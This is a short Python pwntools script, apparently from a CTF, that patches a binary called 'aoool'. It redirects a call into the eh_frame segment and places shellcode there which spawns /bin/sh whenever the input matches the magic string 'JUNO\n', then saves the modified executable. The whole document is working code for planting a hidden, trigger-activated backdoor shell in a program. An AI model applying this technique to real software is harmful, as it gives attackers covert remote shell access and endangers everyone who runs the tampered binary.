from os import system

system("cp aoool z")

from pwn import *

context.arch = 'amd64'
e = ELF("./z")
print e.address
e.asm(0x22a66, '''
call $+21914 /* relative jump to eh_frame segment */
''')

e.asm(0x28000, '''
mov r15 , 44280206666 /* JUNO\n\x00\x00\x00 */
cmp [rbp], r15
jnz x
''' +

shellcraft.amd64.sh()

+ '''
x:
ret
''')

e.save("x")
